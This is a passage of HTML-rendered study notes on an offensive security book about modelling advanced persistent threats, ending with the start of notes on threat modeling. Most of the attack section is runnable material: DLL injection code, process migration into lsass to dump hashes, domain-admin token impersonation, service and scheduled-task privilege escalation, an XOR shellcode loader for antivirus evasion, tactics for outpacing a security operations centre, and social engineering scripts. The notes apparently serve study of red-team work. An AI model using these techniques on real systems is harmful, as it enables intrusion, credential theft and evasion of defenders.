<li>silent install: <code class="codehilite"><span class="n">setup_vmb</span><span class="p">.</span><span class="n">exe</span> <span class="n">s</span> <span class="o">/</span><span class="n">L2057</span> <span class="o">/</span><span class="n">v</span><span class="ss">&quot;OPCO_PROP=23415 /qn /norestart&quot;</span></code></li>
</ul>
</li>
<li>establishes C2</li>
<li>(talk about adding a label that says: SIPDIS means it’s for SIPRNet distribution and NOFORN means No Foreign Nationals )<ul>
<li>Reciever will plug it to SIPRNet workstation to know what's inside</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Part VIII: Experimental Concepts in Command and Control<ul>
<li>C2 Server Guided Agent Management<ul>
<li>allow the C2 server to assign roles to the C2 agents</li>
<li>one becomes master, others send data to master (master repaly to C2)<ul>
<li>have timeout and failover mechanisum</li>
</ul>
</li>
<li>HTTPS is not recommended for carrying C2 data outside the network<ul>
<li>Due to border level security</li>
</ul>
</li>
<li>May use ICMP, SNMP, fake RIP and OSPF messages</li>
</ul>
</li>
<li>Semi-Autonomous C2 Agent Management<ul>
<li>broadcast packet or a fake ARP packet can be used to enable nodes that are not aware of each other’s presence</li>
<li>elect a master<ul>
<li>The host with the most points becomes the new master</li>
<li>points:<ul>
<li>Relative importance of the node (DC)</li>
<li>Previous reliability of the node as noted by uptime</li>
<li>Communication reliability in general (score decrease with every failure)</li>
<li>Random jitter to avoid stagnation</li>
</ul>
</li>
</ul>
</li>
<li>master responsible of<ul>
<li>monitoring slaves</li>
<li>motify c2 if slave goes  offline</li>
<li>central conduit between the C2 server and the C2 slave nodes</li>
<li>Correctly routing C2 messages to C2 slave nodes (c2 only say slave ID)</li>
<li>should not be used for initiating a new election (that is reponsibility of all)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>The Attack<ul>
<li>Bypassing Authentication<ul>
<li>browser pivoting - transparently exploit his or her permissions<ul>
<li>DLL Injection - Inject code into the IE process <ul>
<li>migrate code between processes is a core skill in APT modeling</li>
<li>process of inserting code into an existing (running) process</li>
<li>use the <code class="codehilite"><span class="n">LoadLibraryA</span><span class="p">()</span></code> function in <code class="codehilite"><span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span></code><ul>
<li>this function will register our DLL with the target process</li>
<li>big antivirus no-no</li>
</ul>
</li>
<li>Better approach:<ul>
<li>Attach to the target process (in this case Internet Explorer).<ul>
<li><code class="codehilite"><span class="n">hHandle</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span></code></li>
</ul>
</li>
<li>Allocate memory within the target process.<ul>
<li><code class="codehilite"><span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span><span class="p">,</span><span class="k">FALSE</span><span class="p">,</span><span class="n">procID</span> <span class="p">);</span></code>
<div class="codehilite"><pre><span></span><span class="n">GetFullPathName</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">&quot;proxy.dll&quot;</span><span class="p">),</span> <span class="n">BUFSIZE</span><span class="p">,</span> <span class="n">dllPath</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">hFile</span> <span class="p">=</span> <span class="n">CreateFileA</span><span class="p">(</span> <span class="n">dllPath</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">dllFileLength</span> <span class="p">=</span> <span class="n">GetFileSize</span><span class="p">(</span> <span class="n">hFile</span><span class="p">,</span><span class="n">NULL</span> <span class="p">);</span>
<span class="n">remoteDllAddr</span> <span class="p">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">dllFileLength</span><span class="p">,</span> <span class="n">MEM_RESERVE</span><span class="p">|</span><span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">);</span>
</pre></div></li>
</ul>
</li>
<li>Copy the DLL into the target process memory and calculate an appropriate memory addresses.
  <div class="codehilite"><pre><span></span><span class="n">lpBuffer</span> <span class="p">=</span> <span class="n">HeapAlloc</span><span class="p">(</span> <span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="m">0</span><span class="p">,</span> <span class="n">dllFileLength</span> <span class="p">);</span> 
<span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">dllFileLength</span><span class="p">,</span> <span class="p">&amp;</span><span class="n">dwBytesRead</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpRemoteLibraryBuffer</span><span class="p">,</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">dllFileLength</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">dwReflectiveLoaderOffset</span> <span class="p">=</span> <span class="n">GetReflectiveLoaderOffset</span><span class="p">(</span><span class="n">lpWriteBuff</span><span class="p">);</span>
</pre></div></li>
<li>Instruct the target process to execute your DLL.
  <div class="codehilite"><pre><span></span><span class="n">rThread</span> <span class="p">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hTargetProcHandle</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">lpStartExecAddr</span><span class="p">,</span> <span class="n">lpExecParam</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">rThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
</pre></div></li>
</ul>
</li>
</ul>
</li>
<li>Create a web proxy Dynamic Link Library (DLL) based on the Microsoft WinInet API<ul>
<li>Internet Explorer uses the WinInet API exclusively for communication</li>
<li>Inject proxy to intercept and read session finroamtion</li>
</ul>
</li>
<li>Pass web traffic through our SSH tunnel and the newly created proxy</li>
</ul>
</li>
</ul>
</li>
<li>Situational Awareness<ul>
<li>ascertain exactly where you are in a target’s network</li>
<li>what privileges you have</li>
<li><a href="https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</a>: collection of PowerShell projects with a focus on offensive operations</li>
<li>PowerView, can be used to query the AD in a number of ways
  <div class="codehilite"><pre><span></span><span class="nv">c</span>:<span class="o">&gt;</span> <span class="nv">powershell</span>.<span class="nv">exe</span> <span class="o">-</span><span class="nv">nop</span> <span class="o">-</span><span class="k">exec</span> <span class="nv">bypass</span>
<span class="nv">PS</span> <span class="nv">c</span>:<span class="o">&gt;</span> <span class="nv">import</span><span class="o">-</span><span class="nv">module</span> .\<span class="nv">powerview</span>.<span class="nv">ps1</span>
<span class="nv">PS</span> <span class="nv">c</span>:<span class="o">&gt;</span> <span class="nv">Get</span><span class="o">-</span><span class="nv">NetDomain</span> <span class="o">|</span> <span class="nv">Out</span><span class="o">-</span><span class="nv">File</span> <span class="o">-</span><span class="nv">Encoding</span> <span class="nv">ascii</span> <span class="nv">domains</span>.<span class="nv">txt</span>
<span class="nv">PS</span> <span class="nv">c</span>:<span class="o">&gt;</span> <span class="nv">Get</span><span class="o">-</span><span class="nv">NetComputer</span> <span class="o">-</span><span class="nv">FullData</span> <span class="o">|</span> <span class="nv">Out</span><span class="o">-</span><span class="nv">File</span> <span class="o">-</span><span class="nv">encoding</span> <span class="nv">ascii</span> <span class="nv">machines</span>.<span class="nv">txt</span>
<span class="nv">PS</span> <span class="nv">c</span>:<span class="o">&gt;</span> <span class="nv">Get</span><span class="o">-</span><span class="nv">NetUser</span> <span class="o">-</span><span class="nv">FullData</span> <span class="o">|</span> <span class="nv">Out</span><span class="o">-</span><span class="nv">File</span> <span class="o">-</span><span class="nv">encoding</span> <span class="nv">ascii</span> <span class="nv">users</span>.<span class="nv">txt</span>
</pre></div></li>
<li>FortiGate OS Version 4.8</li>
<li><code class="codehilite"><span class="nv">sqlcmd</span> <span class="o">-</span><span class="nv">s</span> <span class="nv">medlab03</span><span class="o">-</span><span class="nv">SQL</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">coll</span><span class="o">-</span><span class="nv">domain</span><span class="o">/</span><span class="nv">dgammon</span> <span class="o">-</span><span class="nv">p</span> <span class="nv">ILoveJustinBieber</span> <span class="o">-</span><span class="nv">q</span> <span class="s2">&quot;</span><span class="s">exec sp_databases</span><span class="s2">&quot;</span></code></li>
<li><code class="codehilite"><span class="n">sqlcmd</span> <span class="o">-</span><span class="n">s</span> <span class="n">medlab03</span><span class="o">-</span><span class="k">SQL</span> <span class="o">-</span><span class="n">u</span> <span class="n">coll</span><span class="o">-</span><span class="k">domain</span><span class="o">/</span><span class="n">dgammon</span> <span class="o">-</span><span class="n">p</span> <span class="n">ILoveJustinBieber</span> <span class="o">-</span><span class="n">Q</span> <span class="ss">&quot;BACKUP DATABASE perfuse_db TO DISK=&#39;C:\perfuse_db.bak&#39;&quot;</span></code></li>
<li>Get IPs of hosts:
  <div class="codehilite"><pre><span></span><span class="n">foreach</span> <span class="p">(</span><span class="err">$</span><span class="n">computer</span> <span class="k">in</span> <span class="p">(</span><span class="k">get</span><span class="o">-</span><span class="n">content</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">hosts</span><span class="p">.</span><span class="n">txt</span><span class="p">))</span> <span class="err">{</span> <span class="n">Try</span><span class="err">{</span>
    <span class="p">[</span><span class="k">system</span><span class="p">.</span><span class="n">net</span><span class="p">.</span><span class="n">Dns</span><span class="p">]::</span><span class="n">GetHostAddresses</span><span class="p">(</span><span class="err">$</span><span class="n">computer</span><span class="p">)</span> <span class="o">|</span> <span class="n">Foreach</span><span class="o">-</span><span class="k">Object</span> <span class="err">{</span> <span class="k">add</span><span class="o">-</span><span class="n">content</span> <span class="o">-</span><span class="n">path</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">hosts</span><span class="o">-</span><span class="n">ips</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">value</span> <span class="ss">&quot;$($_.IPAddressToString)&quot;</span><span class="err">}</span>
<span class="err">}</span> <span class="n">Catch</span> <span class="err">{</span>
<span class="err">}</span> <span class="err">}</span>
</pre></div></li>
</ul>
</li>
<li>Migration<ul>
<li>Process<ul>
<li>Checking if the meterpreter process has the <code class="codehilite"><span class="n">SeDebugPrivilege</span></code></li>
<li>Getting payload from the handler &amp; Calculating its length</li>
<li>Calling the <code class="codehilite"><span class="n">OpenProcess</span><span class="p">()</span></code> API to gain access to the virtual memory of the target process.</li>
<li>Calling the <code class="codehilite"><span class="n">VirtualAllocEx</span><span class="p">()</span></code> API to allocate an RWX (Read, Write, Execute) memory in the target process.</li>
<li>Calling the <code class="codehilite"><span class="n">WriteProcessMemory</span><span class="p">()</span></code> API to write the payload in the target memory virtual memory space.</li>
<li>Calling the <code class="codehilite"><span class="n">CreateRemoteThread</span><span class="p">()</span></code> API to execute the newly created memory stub having the injected payload in a new thread.</li>
<li>Terminating the initial Meterpreter process.</li>
</ul>
</li>
<li>Uses<ul>
<li>migrate into the <code class="codehilite"><span class="n">lsass</span><span class="p">.</span><span class="n">exe</span></code> process and dump cached hashes without touching the disk</li>
<li>Windows logon credentials, you must first inject into the <code class="codehilite"><span class="n">winlogon</span><span class="p">.</span><span class="n">exe</span></code> process</li>
</ul>
</li>
</ul>
</li>
<li>After compromise <ul>
<li>Check if  a domain-admin has signed into a machine where you have local-admin access to: PowerView <code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">StealthUserhunter</span> <span class="o">-</span><span class="n">GroupName</span> <span class="ss">&quot;Domain Admins&quot;</span></code></li>
<li>Impersonate domain admin:
  <div class="codehilite"><pre><span></span><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">incognito</span>
<span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">getuid</span>
<span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">list_tokens</span> <span class="o">-</span><span class="n">u</span>
<span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">impersonate_token</span> <span class="n">PHARMA</span><span class="err">\</span><span class="n">globaladmin</span>
</pre></div></li>
<li>Search for files: <code class="codehilite"><span class="n">dir</span> <span class="err">\\</span><span class="n">hostname</span><span class="err">\</span><span class="k">c</span><span class="err">$\</span><span class="o">*</span><span class="p">.</span><span class="n">xl</span><span class="o">*</span> <span class="o">/</span><span class="n">s</span><span class="o">/</span><span class="n">b</span></code><ul>
<li><code class="codehilite"><span class="n">Personal</span> <span class="k">Storage</span> <span class="k">Table</span> <span class="p">(.</span><span class="n">pst</span><span class="p">)</span></code></li>
<li><code class="codehilite"><span class="n">Offline</span> <span class="n">Stored</span> <span class="k">Table</span> <span class="p">(.</span><span class="n">ost</span><span class="p">)</span></code></li>
</ul>
</li>
<li>WMIC installer, which will allow us to invisibly deploy software remotely without any further user interaction:
  <div class="codehilite"><pre><span></span><span class="n">wmic</span>
<span class="o">&gt;</span> <span class="o">/</span><span class="n">node</span><span class="o">::</span><span class="s">@&quot;c:\computers.txt&quot;</span> <span class="n">product</span> <span class="n">call</span> <span class="n">install</span> <span class="nb">true</span><span class="p">,</span><span class="s">&quot;&quot;</span> <span class="p">,</span> <span class="s">&quot;c:\ PathToYour\File.msi</span>
</pre></div></li>
<li>Credentials<ul>
<li>Decrypting the credential store</li>
<li>copy the encrypted hashes<ul>
<li>re-create the login file or Registry entries locally</li>
<li>let you access the applications they are intended to secure</li>
<li>use a network sniffer (such as Wireshark) on your own machine to see the password transmitted in the clear</li>
</ul>
</li>
</ul>
</li>
<li>Keyloggers and Cookies<ul>
<li>delete the cookies and force the users to log in: <code class="codehilite"><span class="n">RunDll32</span><span class="p">.</span><span class="n">exe</span> <span class="n">InetCpl</span><span class="p">.</span><span class="n">cpl</span><span class="p">,</span><span class="n">ClearMyTracksByProcess</span> <span class="mi">2</span></code></li>
<li>Chrome: Delete relevant file in: <code class="codehilite"><span class="nt">C</span><span class="o">:</span><span class="err">\</span><span class="nt">Users</span><span class="err">\</span><span class="o">&amp;</span><span class="nt">lt</span><span class="o">;</span><span class="nt">username</span><span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span><span class="err">\</span><span class="nt">AppData</span><span class="err">\</span><span class="nt">Local</span><span class="err">\</span><span class="nt">Google</span><span class="err">\</span><span class="nt">Chrome</span><span class="err">\</span><span class="nt">User</span> <span class="nt">Data</span></code></li>
</ul>
</li>
<li>Windows Previlege Escalation <ul>
<li>Local exploit<ul>
<li><code class="codehilite"><span class="n">wmic</span> <span class="n">qfe</span> <span class="k">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span></code></li>
<li><code class="codehilite"><span class="n">wmic</span> <span class="n">qfe</span> <span class="k">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span> <span class="o">|</span> <span class="n">findstr</span> <span class="o">/</span><span class="k">C</span><span class="p">:</span><span class="ss">&quot;KB2393802&quot;</span></code></li>
<li><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester.git">https://github.com/GDSSecurity/Windows-Exploit-Suggester.git</a></li>
</ul>
</li>
<li>Flawed installation method<ul>
<li><code class="codehilite"><span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span></code></li>
<li><code class="codehilite"><span class="n">sysprep</span><span class="p">.</span><span class="n">xml</span></code></li>
<li><code class="codehilite"><span class="n">unattended</span><span class="p">.</span><span class="n">xml</span></code></li>
</ul>
</li>
<li>Scheduled tasks<ul>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="o">/</span><span class="n">v</span></code></li>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onstart</span></code></li>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onlogon</span></code></li>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onidle</span> <span class="o">/</span><span class="n">i</span> <span class="err">{</span><span class="mi">1</span> <span class="o">-</span> <span class="mi">999</span><span class="err">}</span></code></li>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">once</span> <span class="o">/</span><span class="n">st</span> <span class="o">&lt;</span><span class="n">HH</span><span class="p">:</span><span class="n">MM</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onlogon</span> <span class="o">/</span><span class="n">ru</span> <span class="k">System</span></code> runs with system permissions</li>
<li><code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="k">create</span> <span class="o">/</span><span class="n">tn</span> <span class="o">&lt;</span><span class="n">TaskName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">tr</span> <span class="o">&lt;</span><span class="n">TaskRun</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">sc</span> <span class="n">onlogon</span> <span class="o">/</span><span class="n">s</span> <span class="o">&lt;</span><span class="n">PC_Name</span><span class="o">&gt;</span></code> runs on a remote computer</li>
</ul>
</li>
<li>Vulnerable services<ul>
<li><code class="codehilite"><span class="n">net</span> <span class="k">start</span></code></li>
<li><code class="codehilite"><span class="n">sc</span> <span class="n">qc</span> <span class="n">VulnService</span></code></li>
<li><code class="codehilite"><span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">ucqv</span> <span class="n">VulnService</span></code></li>
<li><code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">VulnPath</span> <span class="n">binpath</span><span class="o">=</span> <span class="ss">&quot;C:\temp\c2agent.exe&quot;</span></code></li>
<li><code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">VulnPath</span> <span class="n">obj</span><span class="o">=</span> <span class="ss">&quot;.\LocalSystem&quot;</span> <span class="n">password</span><span class="o">=</span> <span class="ss">&quot;&quot;</span></code></li>
</ul>
</li>
<li>DLL hijacking<ul>
<li>DLL is loaded into the process space of the program calling it (becomes part of that program)</li>
<li>DLL has no execution permissions of its own</li>
<li>inherits permissions from the executable that imports it</li>
<li>Recon:<ul>
<li>Which processes will load with elevated privileges</li>
<li>Which DLLs you can overwrite with the privileges you have</li>
<li>What DLLs are being imported by any given process</li>
</ul>
</li>
<li>Workflow:<ul>
<li>search processes: <code class="codehilite"><span class="n">tasklist</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">FI</span> <span class="ss">&quot;username eq system&quot;</span> <span class="o">/</span><span class="n">v</span></code></li>
<li><code class="codehilite"><span class="n">Dependency</span> <span class="n">Walker</span></code> to identify DLLs used </li>
<li><code class="codehilite"><span class="n">icacls</span> <span class="n">mmfs2</span><span class="p">.</span><span class="n">dll</span></code> to check permissions </li>
<li>craft DLL (c++)
  <div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt; </span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;This string will be written to the console when this DLL is imported</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="k">break</span><span class="p">;</span> 
<span class="p">}</span>
</pre></div></li>
</ul>
</li>
</ul>
</li>
<li>Registry checks<ul>
<li>AlwaysInstallElevated</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>CallerID<ul>
<li>VoIP vendors that allow outbound calling globally for low rates</li>
<li>critically—the option to set your own Caller ID and SMS number (CallWithUs)</li>
</ul>
</li>
</ul>
</li>
<li>Detection and the Security Operations Center<ul>
<li>IDS<ul>
<li>Network Intrusion Detection System (NIDS)<ul>
<li>passive sniffing interfaces</li>
<li>data directly from the switch (span, tap, or mirror port)</li>
<li>don’t hose network’s core bandwidth</li>
</ul>
</li>
<li>Host-based Intrusion Detection System (HIDS)<ul>
<li>problems on end-points</li>
<li>file integrity monitoring, rootkit checks, and Windows Registry checks.</li>
</ul>
</li>
<li>IDS<ul>
<li>monitors network traffic for malicious behavior, system log messages, and user activity.</li>
</ul>
</li>
<li><img alt="" src="../_assets/2020-08-15-18-58-14.png" /></li>
</ul>
</li>
<li>IDS Evasion<ul>
<li>AlienVault trial can be used to test</li>
<li>understand its OTX (Open Threat eXchange) integration</li>
<li><code class="codehilite"><span class="n">EventRisk</span> <span class="o">=</span> <span class="p">(</span><span class="n">AssetValue</span> <span class="err">×</span> <span class="n">EventPriority</span> <span class="err">×</span> <span class="n">EventReliability</span><span class="p">)</span> <span class="o">/</span> <span class="mi">25</span></code></li>
<li>asset with a low value and priority with a rule that is not considered to be sufficiently reliable is not going to get flagged</li>
<li>aim to compromise endpoints that are going to have the lowest asset value (printer)</li>
<li>Cisco router will likely be considered a high-value asset but monitoring usually has to be carefully tuned to avoid excess false positives</li>
<li>A light port scan coming from a Cisco device will likely not be flagged or be immediately closed by the SOC team</li>
<li>TCL scripting language in Cisco devices can be used to script an attack</li>
</ul>
</li>
<li>Security Operations Center (SOC) <ul>
<li>these are the people you have to beat in an APT modeling exercise</li>
<li>Team:<ul>
<li><strong>Shift manager</strong> — Responsible for handovers between shifts and associated duties (briefing status)</li>
<li><strong>First line SOC analysts</strong> — Working in shifts 24/7 monitoring the SIEM<ul>
<li>attack is detected, a ticket is raised and passed to the second line analysts</li>
</ul>
</li>
<li><strong>Second line SOC analysts</strong> — Also available 24/7, although not necessarily on site<ul>
<li>determine if the ticket is a false positive or needs to be escalated to the third line analysts</li>
</ul>
</li>
<li><strong>Third line SOC analysts</strong> — Technically available 24/7 depending on the nature of the incident<ul>
<li>serious ongoing security incident or “active shooter” scenario</li>
</ul>
</li>
</ul>
</li>
<li>final hour of a shift change in the early hours of the morning (3-4am) will likely be the time when the SOC reaction time is at its slowest</li>
<li>Disrupt: <ul>
<li>Stage an attack on a different part</li>
<li>Vulnerability scanners and brute force authentication attacks from multiple IPs</li>
<li>Aim to put as many tickets between you and your attack</li>
</ul>
</li>
</ul>
</li>
<li>AV Evading<ul>
<li>x86/shikata_ga_nai and XORing it with a simple key and use loader:
  <div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">b</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="cm">/* your XORd with key of &#39;xyz&#39; shellcode goes here*/</span><span class="p">};</span> <span class="kt">char</span> <span class="n">c</span><span class="p">[</span><span class="k">sizeof</span> <span class="n">b</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span> <span class="n">b</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="n">c</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="sc">&#39;x&#39;</span><span class="p">;}</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">c</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_</span> <span class="n">READWRITE</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">c</span><span class="p">);</span>
  <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
<span class="p">}</span>
</pre></div></li>
<li>In agent code don't use  words like <code class="codehilite"><span class="n">Base64Decode</span></code> (book uses <code class="codehilite"><span class="n">monkey</span></code> instead)</li>
<li>Veil Evasion</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Social Engineering <ul>
<li>Fuzzy Fact (hand writing of name is not clesr, hence ask for help)</li>
<li>Psychic Credit <ul>
<li>credit them with knowledge or experience they don’t have</li>
<li>treating the target as an equal and according them the respect of a peer</li>
<li>"I’m normally not used to dealing with people who know what they’re talking about—this is a nice change!"</li>
<li>"You’re the expert so I was wondering if you could tell me...."</li>
</ul>
</li>
<li>The Rainbow Ruse<ul>
<li>statement that credits the client with both a personality trait and its opposite</li>
<li>irrefutable statement and that’s social engineering gold</li>
</ul>
</li>
<li>Flattery / praising the concern / <ul>
<li>similar to the psychic credit, but is broader in its approach (“You’re warm and loving.”)</li>
<li>“I have to say I think your adherence to the essence of what security really is is spot on. Getting the balance right between functional process and security is never easy, but I think you’ve really judged it well—probably a bit better than most companies in your sector. At least in my experience.”</li>
</ul>
</li>
<li>The Jacques Statement</li>
<li>The Barnum Statement<ul>
<li>“something to please everybody.”</li>
<li>Statement is one that is designed to ring true to everyone</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="threat-modeling-designing-for-security">Threat Modeling Designing for Security<a class="headerlink" href="#threat-modeling-designing-for-security" title="Permanent link">&para;</a></h3>
<ul>
<li>Threat modeling is the use of abstractions to aid in thinking about risks.<ul>
<li>Without threat models, you can never stop playing whack-a-mole</li>
<li>Threat modeling should focus on issues that other techniques can’t find</li>
<li>“Think Like an Attacker” Considered Harmful<ul>
<li>thinking like a professional chef: Even if you’re a great home cook, a restaurant-managing chef has to wrestle with problems that a home cook does not.</li>
<li>you may end up with implicit or incorrect assumptions about how an attacker will think</li>
<li>may lead you to focus on the wrong threats</li>
</ul>
</li>
</ul>
</li>
<li>Reasons to Threat Model<ul>
<li>Find Security Bugs Early</li>
<li>Understand Your Security Requirements</li>
<li>Engineer and Deliver Better Products</li>
<li>Address Issues Other Techniques Won’t<ul>
<li>errors of omission (no code analysis tool will find)</li>
<li>issues unique to your design</li>
</ul>
</li>
</ul>
</li>
<li>Four step framework <ul>
<li>Model System - What are you building?<ul>
<li>Show trust boundaries <ul>
<li>Accounts (UIDs on unix systems, or SIDS on Windows)</li>
<li>Network interfaces</li>
<li>Different physical computers</li>
<li>Virtual machines</li>
<li>Organizational boundaries</li>
<li>Almost anywhere you can argue for different privileges</li>
</ul>
</li>
</ul>
</li>
<li>Find Threats - What can go wrong with it once it’s built?<ul>
<li><strong>Spoofing</strong> - pretending to be something or someone you’re not.<ul>
<li>Someone might pretend to be another customer -&gt; authenticate users</li>
<li>Someone might also pretend to be your website -&gt; SSL certificate and single domain</li>
</ul>
</li>
<li><strong>Tampering</strong> - modifying something you’re not supposed to modify.<ul>
<li>Data tampering at backend</li>
<li>Data tampering during transit </li>
<li>Someone deploy code thinking it's dev-env</li>
<li>Angry programmer adding a discount code</li>
</ul>
</li>
